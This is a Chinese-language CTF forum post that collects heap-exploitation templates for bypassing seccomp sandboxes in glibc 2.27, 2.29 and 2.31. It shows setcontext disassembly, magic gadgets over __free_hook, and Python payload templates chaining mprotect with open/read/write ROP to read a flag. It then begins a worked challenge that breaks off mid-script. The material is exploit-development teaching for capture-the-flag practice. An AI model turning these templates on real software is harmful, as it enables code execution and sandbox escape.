---
title: 2.35版本以下堆沙盒绕过模板总结带例题
url: https://forum.butian.net/share/4063
source: 奇安信攻防社区
date: 2025-01-23
fetch_date: 2025-10-06T20:07:56.417973
---

# 2.35版本以下堆沙盒绕过模板总结带例题

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### 2.35版本以下堆沙盒绕过模板总结带例题

* [CTF](https://forum.butian.net/topic/52)

总结了2.35版本以下堆沙盒绕过的各种模板,包括2.27，2.29，2.31的原理和模板还有对应例题

libc 2.27
=========
利用绕过原理setcontext+53 mprotect+orw
下面是setcontext的源码
```php
<setcontext+53>: mov rsp, QWORD PTR [rdi+0xa0]
<setcontext+60>: mov rbx, QWORD PTR [rdi+0x80]
<setcontext+67>: mov rbp, QWORD PTR [rdi+0x78]
<setcontext+71>: mov r12, QWORD PTR [rdi+0x48]
<setcontext+75>: mov r13, QWORD PTR [rdi+0x50]
<setcontext+79>: mov r14, QWORD PTR [rdi+0x58]
<setcontext+83>: mov r15, QWORD PTR [rdi+0x60]
<setcontext+87>: mov rcx, QWORD PTR [rdi+0xa8]
<setcontext+94>: push rcx
<setcontext+95>: mov rsi, QWORD PTR [rdi+0x70]
<setcontext+99>: mov rdx, QWORD PTR [rdi+0x88]
<setcontext+106>: mov rcx, QWORD PTR [rdi+0x98]
<setcontext+113>: mov r8, QWORD PTR [rdi+0x28]
<setcontext+117>: mov r9, QWORD PTR [rdi+0x30]
<setcontext+121>: mov rdi, QWORD PTR [rdi+0x68]
<setcontext+125>: xor eax, eax
<setcontext+127>: ret
<setcontext+128>: mov rcx, QWORD PTR [rip+0x398d91]
<setcontext+135>: neg eax
<setcontext+137>: mov DWORD PTR fs:[rcx], eax
<setcontext+140>: or rax, 0xffffffffffffffff
<setcontext+144>: ret
```
我们利用已知漏洞把free换成setcontext+53 后，free的地址 就是我们的rdi，因此我们可以控制各种寄存器， 然后我们只需要劫持rdi,rsi,rdx 为
mprotect所需要的参数(addr,len,prot)就可以附上可执行权限了，然后通过劫持rbp返回存好了orw的地方进行orw
- \*\*`addr`\*\*: 通常对应于 `rdi` 寄存器。
- \*\*`len`\*\*: 通常对应于 `rsi` 寄存器。
- \*\*`prot`\*\*: 通常对应于 `rdx` 寄存器。
模板
--
```php
orw=b''
orw+=p64(pop\\_rdi)+p64(flag\\_addr)+p64(pop\\_rsi)+p64(0)+p64(pop\\_rdx)+p64(0)+p64(open\\_addr)
orw+=p64(pop\\_rdi)+p64(3)+p64(pop\\_rsi)+p64(flag\\_addr)+p64(pop\\_rdx)+p64(0x30)+p64(read\\_addr)
orw+=p64(pop\\_rdi)+p64(1)+p64(pop\\_rsi)+p64(flag\\_addr)+p64(pop\\_rdx)+p64(0x30)+p64(write\\_addr)
#flag 是存放flag的位置
​
p1=b''
p1 = p1.ljust(0x68, b'\\x00') + p64(heap\\_addr-0x7f0) #mprotect的addr 也就是heap\\_base
p1 = p1.ljust(0x70, b'\\x00') + p64(0x2000) #mprotect的size
p1 = p1.ljust(0x78, b'\\x00') + p64(rop\\_addr) #rbp
​
p1 = p1.ljust(0x88, b'\\x00') + p64(7) #mprotect的prot
p1 = p1.ljust(0xa0, b'\\x00') + p64(rop\\_addr) #rsp
p1 = p1.ljust(0xa8, b'\\x00') + p64(mprotect\\_addr) #rcx
​
edit(num,p1)
delete(p1)
```
libc2.29
========
利用绕过原理 setcontext+61 + mprotect+orw+magic
在libc2.29版本之后 setcontext的代码由rdi变为了rdx
```php
<setcontext+61>: mov   ebx,DWORD PTR \[rdx+0x80\]
<setcontext+67>: mov   rbp,QWORD PTR \[rdx+0x78\]
<setcontext+71>: mov   r12,QWORD PTR \[rdx+0x48\]
<setcontext+75>: mov   r13,QWORD PTR \[rdx+0x50\]
<setcontext+79>: mov   r14,QWORD PTR \[rdx+0x58\]
<setcontext+83>: mov   r15,QWORD PTR \[rdx+0x60\]
<setcontext+87>: mov   rcx,QWORD PTR \[rdx+0xa8\]
<setcontext+94>: push   rcx
<setcontext+95>: mov   rsi,QWORD PTR \[rdx+0x70\]
<setcontext+99>: mov   rdi,QWORD PTR \[rdx+0x68\]
<setcontext+103>: mov   rcx,QWORD PTR \[rdx+0x98\]
<setcontext+110>: mov   r8,QWORD PTR \[rdx+0x28\]
<setcontext+114>: mov   r9,QWORD PTR \[rdx+0x30\]
<setcontext+118>: mov   rdx,QWORD PTR \[rdx+0x88\]
<setcontext+125>: xor   eax,eax
<setcontext+127>: ret
```
magic:0x12be97
```php
mov rdx, qword ptr \[rdi + 8\];
mov rax, qword ptr \[rdi\];
mov rdi, rdx;
jmp rax;
```
可以通过覆盖free\\_hook 为magic 然后把rdx转化为\[rdi+8\] 此时的rdi是我们的堆块，并且可以通过后面的jmp rax 进入setcontext+61 就完成了转化，剩下的攻击方式 就是mprotext + orw
- \*\*`addr`\*\*: 通常对应于 `rdi` 寄存器。
- \*\*`len`\*\*: 通常对应于 `rsi` 寄存器。
- \*\*`prot`\*\*: 通常对应于 `rdx` 寄存器。
模板
--
```php
orw=b''
orw+=p64(pop\\_rdi)+p64(flag)+p64(pop\\_rsi)+p64(0)+p64(pop\\_rdx)+p64(0)+p64(open\\_addr)
orw+=p64(pop\\_rdi)+p64(3)+p64(pop\\_rsi)+p64(flag\\_addr)+p64(pop\\_rdx)+p64(0x30)+p64(read\\_addr)
orw+=p64(pop\\_rdi)+p64(1)+p64(pop\\_rsi)+p64(flag\\_addr)+p64(pop\\_rdx)+p64(0x30)+p64(write\\_addr)
magic\\_gadget=0x0000000000151990+libc\\_addr   #覆盖到hook函数上
​
p1 = p64(setcontext\\_61) + p64(heap\\_addr +0x420)
p1 = p1.ljust(0x68, b'\\x00') + p64(heap\\_addr-0x1e0)
p1 = p1.ljust(0x70, b'\\x00') + p64(0x2000)
p1 = p1.ljust(0x78, b'\\x00') + p64(rop\\_addr)
p1 = p1.ljust(0x88, b'\\x00') + p64(7)
p1 = p1.ljust(0x98, b'\\x00') + p64(mprotect\\_addr)
#尽量布置到一个堆块上
edit(num,p1)
delete(num)
```
libc2.31
========
利用绕过原理 setcontext+61 + mprotect+orw+magic
在libc2.29版本之后 setcontext的代码由rdi变为了rdx
```php
<setcontext+61>:     mov   rsp, qword ptr \[rdx + 0xa0\]
<setcontext+68>:     mov   rbx, qword ptr \[rdx + 0x80\]
<setcontext+75>:     mov   rbp, qword ptr \[rdx + 0x78\]
<setcontext+79>:     mov   r12, qword ptr \[rdx + 0x48\]
<setcontext+83>:     mov   r13, qword ptr \[rdx + 0x50\]
<setcontext+87>:     mov   r14, qword ptr \[rdx + 0x58\]
<setcontext+91>:     mov   r15, qword ptr \[rdx + 0x60\]
<setcontext+95>:     test   dword ptr fs:\[0x48\], 2
<setcontext+107>: ✔ je     setcontext+294
<setcontext+294>:   mov   rcx, qword ptr \[rdx + 0xa8\]
<setcontext+301>:   push   rcx
<setcontext+302>:   mov   rsi, qword ptr \[rdx + 0x70\]
<setcontext+306>:   mov   rdi, qword ptr \[rdx + 0x68\]
<setcontext+310>:   mov   rcx, qword ptr \[rdx + 0x98\]
<setcontext+317>:   mov   r8, qword ptr \[rdx + 0x28\]
<setcontext+321>:   mov   r9, qword ptr \[rdx + 0x30\]
<setcontext+325>:   mov   rdx, qword ptr \[rdx + 0x88\]
<setcontext+332>:   xor   eax, eax
<setcontext+334>:   ret
```
因为常规情况下我们只能控制rdi，所以我们要找到一些magic进行一些转换
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2024/12/attach-fb925af0fd07ea204fcd0e65b7e8c3addecd727a.png)
比如2.31版本
```php
mov,rdx.qword ptr \[rdi+8\]; mov qword ptr \[rsp\],rax; call qword ptr \[rdx+0x20\]
```
可以通过覆盖free\\_hook 为magic 然后把rdx转化为\[rdi+8\] 此时的rdi是我们的堆块，并且可以通过后面的call 进入setcontext+61 就完成了转化，剩下的攻击方式 和2.27没有i太大的区别
模板
--
```php
orw=b''
orw+=p64(pop\\_rdi)+p64(flag)+p64(pop\\_rsi)+p64(0)+p64(pop\\_rdx)+p64(0)+p64(open\\_addr)
orw+=p64(pop\\_rdi)+p64(3)+p64(pop\\_rsi)+p64(flag\\_addr)+p64(pop\\_rdx)+p64(0x30)+p64(read\\_addr)
orw+=p64(pop\\_rdi)+p64(1)+p64(pop\\_rsi)+p64(flag\\_addr)+p64(pop\\_rdx)+p64(0x30)+p64(write\\_addr)
magic\\_gadget=0x0000000000151990+libc\\_addr   #覆盖到hook函数上
​
p1 = p64(heap\\_addr + 0x420) + p64(heap\\_addr +0x420-0x20)
p1 = p1.ljust(0x10, b'\\x00') + p64(setcontext\\_61)
p1 = p1.ljust(0x58, b'\\x00') + p64(heap\\_addr-0x1e0)
p1 = p1.ljust(0x60, b'\\x00') + p64(0x2000)
p1 = p1.ljust(0x78, b'\\x00') + p64(7)
p1 = p1.ljust(0x90, b'\\x00') + p64(rop\\_addr)
p1 = p1.ljust(0x98, b'\\x00') + p64(mprotect\\_addr)
#尽量布置到一个堆块上
edit(num,p1)
delete(num)
```
例题
==
由于是主要讲沙盒绕过 漏洞分析部分省去重点给出绕过沙盒这部分的调试
pwn1
----
题目链接
通过网盘分享的文件：pwn1
链接: <https://pan.baidu.com/s/1Ncro986biNhhV9Pb3I7lFw> 提取码: sn0w
这里前面是protobuf逆向部分，绕过这部分后就是一个常规的堆题 这里给出交互脚本
```php
def add(index, size,content):
Devicemsg = Devicemsg\_pb2.devicemsg()
Devicemsg.actionid = 1
Devicemsg.msgidx = index
Devicemsg.msgsize = size
Devicemsg.msgcontent = content
sa(b'You can try to have friendly communication with me now: \n', Devicemsg.SerializeToString())
def free(index):
Devicemsg = Devicemsg\_pb2.devicemsg()
Devicemsg.actionid = 4
Devicemsg.msgidx = index
Devicemsg.msgsize = 0
Devicemsg.msgcontent = b'a'
sa(b'You can try to have friendly communication with me now: \n', Devicemsg.SerializeToString())
def show(index):
Devicemsg = Devicemsg\_pb2.devicemsg()
Devicemsg.actionid = 3
Devicemsg.msgidx = index
Devicemsg.msgsize = 0
Devicemsg.msgcontent = b'a'
sa(b'You can try to have friendly communication with me now: \n', Devicemsg.SerializeToString())
def edit(index,content):
Devicemsg = Devicemsg\_pb2.devicemsg()
Devicemsg.actionid = 2
Device...